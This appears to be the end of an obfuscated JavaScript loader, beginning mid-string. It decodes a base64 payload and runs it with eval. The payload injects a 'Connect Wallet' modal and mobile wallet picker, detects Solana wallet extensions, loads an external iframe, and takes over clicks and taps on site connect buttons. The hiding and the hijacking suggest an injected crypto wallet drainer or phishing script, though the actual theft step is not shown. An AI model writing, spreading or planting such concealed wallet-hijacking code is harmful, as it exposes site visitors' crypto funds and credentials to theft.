yb3AtZmlsdGVyOmJsdXIoNnB4KTstd2Via2l0LWJhY2tkcm9wLWZpbHRlcjpibHVyKDZweCk7ZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6ZmxleC1lbmQ7ei1pbmRleDoxMDAwMDE7YW5pbWF0aW9uOm53cC1mYWRlIC4ycyBlYXNlfScgKwogICAgICAnLm53cC1jYXJke2JhY2tncm91bmQ6IzE0MTQxNDtib3JkZXItcmFkaXVzOmNsYW1wKDBweCwyNHB4LDQ0cHgpIGNsYW1wKDBweCwyNHB4LDQ0cHgpIDAgMDtwYWRkaW5nOjE2cHggMTJweCBjYWxjKDEycHggKyBlbnYoc2FmZS1hcmVhLWluc2V0LWJvdHRvbSwxMnB4KSk7d2lkdGg6MTAwJTttYXgtd2lkdGg6NDAwcHg7Ym9yZGVyOjFweCBzb2xpZCByZ2JhKDI1NSwyNTUsMjU1LDAuMDYpO2JvcmRlci1ib3R0b206bm9uZTthbmltYXRpb246bndwLXNsaWRlIC4zcyBjdWJpYy1iZXppZXIoLjE2LDEsLjMsMSl9JyArCiAgICAgICcubndwLWhlYWRlcntkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpjZW50ZXI7cG9zaXRpb246cmVsYXRpdmU7cGFkZGluZzo0cHggMCAxMnB4fScgKwogICAgICAnLm53cC10aXRsZXtjb2xvcjojZTRlN2U3O2ZvbnQ6NjAwIDE2cHgvMSBLSFRla2Esc3lzdGVtLXVpLC1hcHBsZS1zeXN0ZW0sc2Fucy1zZXJpZjtsZXR0ZXItc3BhY2luZzotMC4wMWVtfScgKwogICAgICAnLm53cC1jbG9zZXtwb3NpdGlvbjphYnNvbHV0ZTtyaWdodDowO3RvcDoycHg7d2lkdGg6MjhweDtoZWlnaHQ6MjhweDtib3JkZXItcmFkaXVzOjUwJTtiYWNrZ3JvdW5kOnJnYmEoMjU1LDI1NSwyNTUsMC4wNSk7Ym9yZGVyOm5vbmU7Y29sb3I6IzlhOWZhNTtmb250LXNpemU6MTZweDtjdXJzb3I6cG9pbnRlcjtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpjZW50ZXI7LXdlYmtpdC10YXAtaGlnaGxpZ2h0LWNvbG9yOnRyYW5zcGFyZW50fScgKwogICAgICAnLm53cC1jbG9zZTphY3RpdmV7YmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LDAuMSl9JyArCiAgICAgICcubndwLWxpc3R7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbjtnYXA6NHB4fScgKwogICAgICAnLm53cC13YWxsZXR7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTJweDtwYWRkaW5nOjEwcHggMTJweDtiYWNrZ3JvdW5kOnJnYmEoMjU1LDI1NSwyNTUsMC4wMik7Ym9yZGVyLXJhZGl1czoxMnB4O3RleHQtZGVjb3JhdGlvbjpub25lO2NvbG9yOiNlNGU3ZTc7Zm9udDo1MDAgMTRweC8xIEtIVGVrYSxzeXN0ZW0tdWksLWFwcGxlLXN5c3RlbSxzYW5zLXNlcmlmOy13ZWJraXQtdGFwLWhpZ2hsaWdodC1jb2xvcjp0cmFuc3BhcmVudDt0cmFuc2l0aW9uOmJhY2tncm91bmQgLjE1c30nICsKICAgICAgJy5ud3Atd2FsbGV0OmFjdGl2ZXtiYWNrZ3JvdW5kOnJnYmEoMjU1LDI1NSwyNTUsMC4wNil9JyArCiAgICAgICcubndwLXdpY29ue3dpZHRoOjM2cHg7aGVpZ2h0OjM2cHg7Ym9yZGVyLXJhZGl1czo4cHg7ZmxleC1zaHJpbms6MDtvYmplY3QtZml0OmNvdmVyfScgKwogICAgICAnLm53cC13bmFtZXtmbGV4OjF9JyArCiAgICAgICcubndwLXRhZ3tmb250OjUwMCAxMHB4LzEgS0hUZWthLHN5c3RlbS11aSxzYW5zLXNlcmlmO2NvbG9yOiMyNmQ5NjI7YmFja2dyb3VuZDpyZ2JhKDM4LDIxNyw5OCwwLjEyKTtwYWRkaW5nOjNweCA2cHg7Ym9yZGVyLXJhZGl1czoyMHB4O2xldHRlci1zcGFjaW5nOjAuMDJlbTt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2V9JyArCiAgICAgICcubndwLWNoZXZyb257Y29sb3I6cmdiYSgyMjgsMjMxLDIzMSwwLjMpO2ZvbnQtc2l6ZToxNHB4O21hcmdpbi1sZWZ0OjRweH0nICsKICAgICAgJ0BrZXlmcmFtZXMgbndwLWZhZGV7ZnJvbXtvcGFjaXR5OjB9dG97b3BhY2l0eToxfX0nICsKICAgICAgJ0BrZXlmcmFtZXMgbndwLXNsaWRle2Zyb217dHJhbnNmb3JtOnRyYW5zbGF0ZVkoMTAwJSl9dG97dHJhbnNmb3JtOnRyYW5zbGF0ZVkoMCl9fScgKwogICAgICAnPC9zdHlsZT4nOwoKICAgIHZhciB3YWxsZXRzSFRNTCA9ICcnOwogICAgZm9yICh2YXIgaSA9IDA7IGkgPCB3YWxsZXRzLmxlbmd0aDsgaSsrKSB7CiAgICAgIHZhciB3ID0gd2FsbGV0c1tpXTsKICAgICAgdmFyIHRhZ0hUTUwgPSB3LnRhZyA/ICc8c3BhbiBjbGFzcz0ibndwLXRhZyI+JyArIHcudGFnICsgJzwvc3Bhbj4nIDogJyc7CiAgICAgIHdhbGxldHNIVE1MICs9ICc8YSBjbGFzcz0ibndwLXdhbGxldCIgaHJlZj0iJyArIHcudXJsICsgJyI+JyArCiAgICAgICAgJzxpbWcgY2xhc3M9Im53cC13aWNvbiIgc3JjPSInICsgdy5pbWcgKyAnIiBhbHQ9IiIgb25lcnJvcj0idGhpcy5zdHlsZS5kaXNwbGF5PVwnbm9uZVwnO3ZhciBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoXCdzcGFuXCcpO3MuY2xhc3NOYW1lPVwnbndwLXdpY29uXCc7cy5zdHlsZS5jc3NUZXh0PVwnZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2JhY2tncm91bmQ6IzJhMmEyYTtjb2xvcjojZTRlN2U3O2ZvbnQtd2VpZ2h0OjYwMDtmb250LXNpemU6MTZweFwnO3MudGV4dENvbnRlbnQ9XCcnK3cubmFtZS5jaGFyQXQoMCkrJ1wnO3RoaXMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUocyx0aGlzKTsiIC8+JyArCiAgICAgICAgJzxzcGFuIGNsYXNzPSJud3Atd25hbWUiPicgKyB3Lm5hbWUgKyAnPC9zcGFuPicgKwogICAgICAgIHRhZ0hUTUwgKwogICAgICAgICc8c3BhbiBjbGFzcz0ibndwLWNoZXZyb24iPuKAujwvc3Bhbj4nICsKICAgICAgICAnPC9hPic7CiAgICB9CgogICAgdmFyIHBpY2tlckRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgcGlja2VyRGl2LmlkID0gJ25vaXJXYWxsZXRQaWNrZXInOwogICAgcGlja2VyRGl2LmlubmVySFRNTCA9IHBpY2tlckNTUyArCiAgICAgICc8ZGl2IGNsYXNzPSJud3Atb3ZlcmxheSI+JyArCiAgICAgICc8ZGl2IGNsYXNzPSJud3AtY2FyZCI+JyArCiAgICAgICc8ZGl2IGNsYXNzPSJud3AtaGVhZGVyIj4nICsKICAgICAgJzxzcGFuIGNsYXNzPSJud3AtdGl0bGUiPkNvbm5lY3QgV2FsbGV0PC9zcGFuPicgKwogICAgICAnPGJ1dHRvbiBjbGFzcz0ibndwLWNsb3NlIj7inJU8L2J1dHRvbj4nICsKICAgICAgJzwvZGl2PicgKwogICAgICAnPGRpdiBjbGFzcz0ibndwLWxpc3QiPicgKyB3YWxsZXRzSFRNTCArICc8L2Rpdj4nICsKICAgICAgJzwvZGl2PjwvZGl2Pic7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHBpY2tlckRpdik7CgogICAgdmFyIG92ZXJsYXlFbCA9IHBpY2tlckRpdi5xdWVyeVNlbGVjdG9yKCcubndwLW92ZXJsYXknKTsKICAgIHZhciBjbG9zZUVsID0gcGlja2VyRGl2LnF1ZXJ5U2VsZWN0b3IoJy5ud3AtY2xvc2UnKTsKICAgIGlmIChvdmVybGF5RWwpIHsKICAgICAgb3ZlcmxheUVsLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oZXYpIHsKICAgICAgICBpZiAoZXYudGFyZ2V0ID09PSBvdmVybGF5RWwpIHBpY2tlckRpdi5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHBpY2tlckRpdik7CiAgICAgIH0pOwogICAgfQogICAgaWYgKGNsb3NlRWwpIHsKICAgICAgY2xvc2VFbC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKCkgewogICAgICAgIHBpY2tlckRpdi5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHBpY2tlckRpdik7CiAgICAgIH0pOwogICAgfQogIH0KCiAgLy8gRGV0ZWN0IG1vYmlsZSBkZXZpY2UKICAvLyBNb2JpbGUgZGV0ZWN0aW9uIOKAlCBpbmNsdWRlcyBpUGFkT1MgMTMrIChyZXBvcnRzIGFzIE1hY2ludG9zaCBidXQgaGFzIHRvdWNoKQogIHZhciBfX2lzTW9iaWxlID0gL0FuZHJvaWR8d2ViT1N8aVBob25lfGlQYWR8aVBvZHxCbGFja0JlcnJ5fElFTW9iaWxlfE9wZXJhIE1pbmkvaS50ZXN0KG5hdmlnYXRvci51c2VyQWdlbnQpIHx8CiAgICAobmF2aWdhdG9yLm1heFRvdWNoUG9pbnRzID4gMSAmJiAvTWFjaW50b3NoL2kudGVzdChuYXZpZ2F0b3IudXNlckFnZW50KSk7CiAgLy8gRGV0ZWN0IHdhbGxldCBpbi1hcHAgYnJvd3NlciAocHJvdmlkZXIgYWxyZWFkeSBpbmplY3RlZCA9IG5vIHJlZGlyZWN0IG5lZWRlZCkKICB2YXIgX19pc1dhbGxldEJyb3dzZXIgPSAhISh3aW5kb3cucGhhbnRvbT8uc29sYW5hPy5pc1BoYW50b20gfHwgd2luZG93LnNvbGFuYT8uaXNQaGFudG9tIHx8CiAgICB3aW5kb3cuc29sZmxhcmU/LmlzU29sZmxhcmUgfHwgd2luZG93LlNvbGZsYXJlQXBwIHx8CiAgICB3aW5kb3cuYmFja3BhY2s/LmlzQmFja3BhY2sgfHwgd2luZG93LmNvaW5iYXNlU29sYW5hIHx8CiAgICB3aW5kb3cudHJ1c3R3YWxsZXQ/LnNvbGFuYSk7CgogIGZ1bmN0aW9uIGluaXQoKSB7CiAgICBkb2N1bWVudC5ib2R5Lmluc2VydEFkamFjZW50SFRNTCgnYmVmb3JlZW5kJywgbW9kYWxIVE1MKTsKICAgIHZhciBvdmVybGF5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25vaXJNb2RhbE92ZXJsYXknKTsKICAgIHZhciBpZnJhbWUgPSBvdmVybGF5ID8gb3ZlcmxheS5xdWVyeVNlbGVjdG9yKCcubm9pci1tb2RhbC1pZnJhbWUnKSA6IG51bGw7CiAgICB2YXIgc3Bpbm5lciA9IG92ZXJsYXkgPyBvdmVybGF5LnF1ZXJ5U2VsZWN0b3IoJy5ub2lyLXNwaW5uZXInKSA6IG51bGw7CiAgICB2YXIgbm9pclJlYWR5ID0gZmFsc2U7CiAgICB2YXIgcGVuZGluZ09wZW4gPSBmYWxzZTsKICAgIHZhciBfbG9hZFRpbWVvdXQgPSBudWxsOwogICAgdmFyIF9yZXRyeUNvdW50ID0gMDsKCiAgICBmdW5jdGlvbiBzaG93TW9kYWwoKSB7CiAgICAgIG92ZXJsYXkuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsgb3ZlcmxheS5jbGFzc0xpc3QuYWRkKCdub2lyLWFjdGl2ZScpOyB9LCAxMCk7CgogICAgICAvLyBDaGVjayBpZiBpZnJhbWUgaXMgc3RpbGwgYWxpdmUgKG1pZ2h0IGhhdmUgY3Jhc2hlZCBvciBuYXZpZ2F0ZWQgYXdheSkKICAgICAgdmFyIGlmcmFtZUFsaXZlID0gZmFsc2U7CiAgICAgIHRyeSB7IGlmcmFtZUFsaXZlID0gISEoaWZyYW1lICYmIGlmcmFtZS5jb250ZW50V2luZG93KTsgfSBjYXRjaChfKSB7fQoKICAgICAgaWYgKG5vaXJSZWFkeSAmJiBpZnJhbWVBbGl2ZSkgewogICAgICAgIC8vIEZhc3QgcGF0aCDigJQgaWZyYW1lIGFscmVhZHkgbG9hZGVkLCBzaG93IGluc3RhbnRseSB3aXRoIG5vIHNwaW5uZXIKICAgICAgICBpZiAoaWZyYW1lKSB7IGlmcmFtZS5jbGFzc0xpc3QuYWRkKCdub2lyLWlmcmFtZS1yZWFkeScpOyB9CiAgICAgICAgaWYgKHNwaW5uZXIpIHsgc3Bpbm5lci5jbGFzc0xpc3QuYWRkKCdub2lyLWhpZGRlbicpOyB9CiAgICAgICAgaWYgKGlmcmFtZS5jb250ZW50V2luZG93KSB7CiAgICAgICAgICB0cnkgeyBpZnJhbWUuY29udGVudFdpbmRvdy5wb3N0TWVzc2FnZSh7IHR5cGU6ICdub2lyTW9kYWxPcGVuJyB9LCAnKicpOyB9IGNhdGNoIChfKSB7fQogICAgICAgIH0KICAgICAgfSBlbHNlIHsKICAgICAgICAvLyBTbG93IHBhdGgg4oCUIGlmcmFtZSBzdGlsbCBsb2FkaW5nIG9yIGRlYWQsIHNob3cgc3Bpbm5lciBhbmQgd2FpdAogICAgICAgIG5vaXJSZWFkeSA9IGZhbHNlOwogICAgICAgIGlmIChpZnJhbWUpIHsgaWZyYW1lLnN0eWxlLmhlaWdodCA9ICcnOyBpZnJhbWUuY2xhc3NMaXN0LnJlbW92ZSgnbm9pci1pZnJhbWUtcmVhZHknKTsgfQogICAgICAgIGlmIChzcGlubmVyKSB7IHNwaW5uZXIuY2xhc3NMaXN0LnJlbW92ZSgnbm9pci1oaWRkZW4nKTsgfQogICAgICAgIHBlbmRpbmdPcGVuID0gdHJ1ZTsKICAgICAgICAvLyBJZiBpZnJhbWUgZGllZCwgcmVsb2FkIGl0CiAgICAgICAgaWYgKCFpZnJhbWVBbGl2ZSAmJiBpZnJhbWUpIHsgaWZyYW1lLnNyYyA9IE1PREFMX1VSTDsgfQogICAgICAgIC8vIEVycm9yIHJlY292ZXJ5OiBpZiBub2lyUmVhZHkgZG9lc24ndCBmaXJlIHdpdGhpbiAxMHMsIHJlbG9hZCBpZnJhbWUgKHVwIHRvIDIgcmV0cmllcykKICAgICAgICBpZiAoX2xvYWRUaW1lb3V0KSBjbGVhclRpbWVvdXQoX2xvYWRUaW1lb3V0KTsKICAgICAgICBfbG9hZFRpbWVvdXQgPSBzZXRUaW1lb3V0KGZ1bmN0aW9uIHJldHJ5TG9hZCgpIHsKICAgICAgICAgIGlmICghbm9pclJlYWR5ICYmIGlmcmFtZSkgewogICAgICAgICAgICBfcmV0cnlDb3VudCsrOwogICAgICAgICAgICBpZiAoX3JldHJ5Q291bnQgPD0gMikgewogICAgICAgICAgICAgIGlmcmFtZS5zcmMgPSBNT0RBTF9VUkw7CiAgICAgICAgICAgICAgX2xvYWRUaW1lb3V0ID0gc2V0VGltZW91dChyZXRyeUxvYWQsIDEwMDAwKTsKICAgICAgICAgICAgfQogICAgICAgICAgfQogICAgICAgIH0sIDEwMDAwKTsKICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGhpZGVNb2RhbCgpIHsKICAgICAgb3ZlcmxheS5jbGFzc0xpc3QucmVtb3ZlKCdub2lyLWFjdGl2ZScpOwogICAgICBwZW5kaW5nT3BlbiA9IGZhbHNlOwogICAgICBpZiAoX2xvYWRUaW1lb3V0KSB7IGNsZWFyVGltZW91dChfbG9hZFRpbWVvdXQpOyBfbG9hZFRpbWVvdXQgPSBudWxsOyB9CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgb3ZlcmxheS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgIC8vIEtlZXAgaWZyYW1lIGFsaXZlIOKAlCBkb24ndCByZWxvYWQuIFJlb3BlbnMgdXNlIHBvc3RNZXNzYWdlIGZvciBpbnN0YW50IHJlc3BvbnNlLgogICAgICB9LCAzMDApOwogICAgfQoKICAgIC8vIEVuc3VyZSAubm9pci1jb25uZWN0IGVsZW1lbnRzIHJlc3BvbmQgaW5zdGFudGx5IG9uIG1vYmlsZSAobm8gMzAwbXMgdGFwIGRlbGF5KQogICAgdHJ5IHsKICAgICAgdmFyIHRvdWNoU3R5bGUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzdHlsZScpOwogICAgICB0b3VjaFN0eWxlLnRleHRDb250ZW50ID0gJy5ub2lyLWNvbm5lY3R7dG91Y2gtYWN0aW9uOm1hbmlwdWxhdGlvbjstd2Via2l0LXRhcC1oaWdobGlnaHQtY29sb3I6dHJhbnNwYXJlbnR9JzsKICAgICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZCh0b3VjaFN0eWxlKTsKICAgIH0gY2F0Y2goXykge30KCiAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignbWVzc2FnZScsIGZ1bmN0aW9uKGUpIHsKICAgICAgaWYgKCFlLmRhdGEgfHwgdHlwZW9mIGUuZGF0YS50eXBlICE9PSAnc3RyaW5nJykgcmV0dXJuOwogICAgICBpZiAoZS5kYXRhLnR5cGUgPT09ICdub2lyUmVhZHknKSB7CiAgICAgICAgbm9pclJlYWR5ID0gdHJ1ZTsKICAgICAgICBfcmV0cnlDb3VudCA9IDA7CiAgICAgICAgaWYgKF9sb2FkVGltZW91dCkgeyBjbGVhclRpbWVvdXQoX2xvYWRUaW1lb3V0KTsgX2xvYWRUaW1lb3V0ID0gbnVsbDsgfQogICAgICAgIC8vIElmcmFtZSBpcyBsb2FkZWQg4oCUIGZhZGUgaXQgaW4gYW5kIGhpZGUgc3Bpbm5lcgogICAgICAgIGlmIChpZnJhbWUpIHsgaWZyYW1lLmNsYXNzTGlzdC5hZGQoJ25vaXItaWZyYW1lLXJlYWR5Jyk7IH0KICAgICAgICBpZiAoc3Bpbm5lcikgeyBzcGlubmVyLmNsYXNzTGlzdC5hZGQoJ25vaXItaGlkZGVuJyk7IH0KICAgICAgICBpZiAocGVuZGluZ09wZW4pIHsKICAgICAgICAgIHBlbmRpbmdPcGVuID0gZmFsc2U7CiAgICAgICAgICBpZiAoaWZyYW1lICYmIGlmcmFtZS5jb250ZW50V2luZG93KSB7CiAgICAgICAgICAgIHRyeSB7IGlmcmFtZS5jb250ZW50V2luZG93LnBvc3RNZXNzYWdlKHsgdHlwZTogJ25vaXJNb2RhbE9wZW4nIH0sICcqJyk7IH0gY2F0Y2ggKF8pIHt9CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBpZiAoZS5kYXRhLnR5cGUgPT09ICdub2lyTW9kYWxDbG9zZScpIHsgaGlkZU1vZGFsKCk7IHJldHVybjsgfQogICAgICBpZiAoZS5kYXRhLnR5cGUgPT09ICdub2lyTW9kYWxSZXNpemUnICYmIHR5cGVvZiBlLmRhdGEuaGVpZ2h0ID09PSAnbnVtYmVyJyAmJiBpZnJhbWUpIHsKICAgICAgICB2YXIgbWluSCA9IDYwMDsKICAgICAgICB2YXIgbWF4SCA9IE1hdGgubWluKHdpbmRvdy5pbm5lckhlaWdodCAqIDAuOTIsIDkwMCk7CiAgICAgICAgdmFyIGggPSBNYXRoLm1heChtaW5ILCBNYXRoLm1pbihtYXhILCBNYXRoLnJvdW5kKGUuZGF0YS5oZWlnaHQpKSk7CiAgICAgICAgaWZyYW1lLnN0eWxlLmhlaWdodCA9IGggKyAncHgnOwogICAgICB9CiAgICB9KTsKCiAgICBmdW5jdGlvbiBoYW5kbGVOb2lyQ29ubmVjdCgpIHsKICAgICAgaWYgKF9faXNNb2JpbGUgJiYgIV9faXNXYWxsZXRCcm93c2VyKSB7CiAgICAgICAgc2hvd01vYmlsZVdhbGxldFBpY2tlcigpOwogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBpZiAoX19pc01vYmlsZSAmJiBfX2lzV2FsbGV0QnJvd3NlcikgewogICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gTU9EQUxfVVJMICsgJyZhdXRvY29ubmVjdD0xJzsKICAgICAgICByZXR1cm47CiAgICAgIH0KICAgICAgc2hvd01vZGFsKCk7CiAgICB9CgogICAgZnVuY3Rpb24gZmluZE5vaXJDb25uZWN0KGVsKSB7CiAgICAgIHdoaWxlIChlbCAmJiBlbCAhPT0gZG9jdW1lbnQpIHsKICAgICAgICBpZiAoZWwuY2xhc3NMaXN0ICYmIGVsLmNsYXNzTGlzdC5jb250YWlucygnbm9pci1jb25uZWN0JykpIHJldHVybiBlbDsKICAgICAgICBlbCA9IGVsLnBhcmVudEVsZW1lbnQ7CiAgICAgIH0KICAgICAgcmV0dXJuIG51bGw7CiAgICB9CgogICAgLy8gRXZlbnQgZGVsZWdhdGlvbiDigJQgd29ya3Mgd2l0aCBSZWFjdCwgVnVlLCBBbmd1bGFyLCBhbnkgU1BBIGZyYW1ld29yay4KICAgIC8vIEluc3RlYWQgb2Ygc2Nhbm5pbmcgRE9NIG9uY2UgKGJyZWFrcyB3aGVuIFNQQSByZS1yZW5kZXJzIGFuZCByZXBsYWNlcyBub2RlcyksCiAgICAvLyB3ZSBsaXN0ZW4gb24gZG9jdW1lbnQgYW5kIG1hdGNoIGNsaWNrcyBvbiAubm9pci1jb25uZWN0IGVsZW1lbnRzLgogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbihlKSB7CiAgICAgIGlmIChmaW5kTm9pckNvbm5lY3QoZS50YXJnZXQpKSB7CiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgIGUuc3RvcFByb3BhZ2F0aW9uKCk7CiAgICAgICAgaGFuZGxlTm9pckNvbm5lY3QoKTsKICAgICAgfQogICAgfSwgdHJ1ZSk7CgogICAgLy8gTW9iaWxlIGJhY2t1cDogdG91Y2hlbmQgZmlyZXMgaW1tZWRpYXRlbHkgKG5vIDMwMG1zIGRlbGF5IGxpa2UgY2xpY2spLgogICAgLy8gUHJldmVudHMgbWlzc2VkIHRhcHMgd2hlbiBSZWFjdCByZS1yZW5kZXJzIGJldHdlZW4gdG91Y2hzdGFydCBhbmQgY2xpY2suCiAgICBpZiAoX19pc01vYmlsZSkgewogICAgICB2YXIgX3RvdWNoU3RhcnRYID0gMCwgX3RvdWNoU3RhcnRZID0gMCwgX3RvdWNoVGFyZ2V0ID0gbnVsbDsKICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigndG91Y2hzdGFydCcsIGZ1bmN0aW9uKGUpIHsKICAgICAgICBfdG91Y2hUYXJnZXQgPSBlLnRhcmdldDsKICAgICAgICBfdG91Y2hTdGFydFggPSBlLnRvdWNoZXNbMF0uY2xpZW50WDsKICAgICAgICBfdG91Y2hTdGFydFkgPSBlLnRvdWNoZXNbMF0uY2xpZW50WTsKICAgICAgfSwgeyBjYXB0dXJlOiB0cnVlLCBwYXNzaXZlOiB0cnVlIH0pOwoKICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigndG91Y2hlbmQnLCBmdW5jdGlvbihlKSB7CiAgICAgICAgaWYgKCFfdG91Y2hUYXJnZXQpIHJldHVybjsKICAgICAgICB2YXIgZHggPSBlLmNoYW5nZWRUb3VjaGVzWzBdLmNsaWVudFggLSBfdG91Y2hTdGFydFg7CiAgICAgICAgdmFyIGR5ID0gZS5jaGFuZ2VkVG91Y2hlc1swXS5jbGllbnRZIC0gX3RvdWNoU3RhcnRZOwogICAgICAgIC8vIE9ubHkgdHJlYXQgYXMgdGFwIGlmIGZpbmdlciBtb3ZlZCBsZXNzIHRoYW4gMTBweCAobm90IGEgc2Nyb2xsKQogICAgICAgIGlmIChNYXRoLmFicyhkeCkgPiAxMCB8fCBNYXRoLmFicyhkeSkgPiAxMCkgcmV0dXJuOwogICAgICAgIGlmIChmaW5kTm9pckNvbm5lY3QoX3RvdWNoVGFyZ2V0KSkgewogICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgICAgaGFuZGxlTm9pckNvbm5lY3QoKTsKICAgICAgICB9CiAgICAgICAgX3RvdWNoVGFyZ2V0ID0gbnVsbDsKICAgICAgfSwgdHJ1ZSk7CiAgICB9CgogICAgb3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKGUpIHsKICAgICAgaWYgKGUudGFyZ2V0ID09PSBvdmVybGF5KSB7IGhpZGVNb2RhbCgpOyB9CiAgICB9KTsKCiAgICB2YXIgdXJsUGFyYW1zID0gbmV3IFVSTFNlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKTsKICAgIGlmICh1cmxQYXJhbXMuZ2V0KCdzaG93RnJhbWUnKSA9PT0gJ3RydWUnKSB7IHNob3dNb2RhbCgpOyB9CgogICAgd2luZG93Lm5vaXJDb25uZWN0ID0gZnVuY3Rpb24oKSB7IGhhbmRsZU5vaXJDb25uZWN0KCk7IH07CiAgfQoKICBpZiAoZG9jdW1lbnQucmVhZHlTdGF0ZSA9PT0gJ2xvYWRpbmcnKSB7CiAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgaW5pdCk7CiAgfSBlbHNlIHsKICAgIGluaXQoKTsKICB9Cn0KCmJvb3QoKTsKfSkoKTs=");var _0x3oo89y=decodeURIComponent(escape(_0xlxyz9e));eval(_0x3oo89y)})();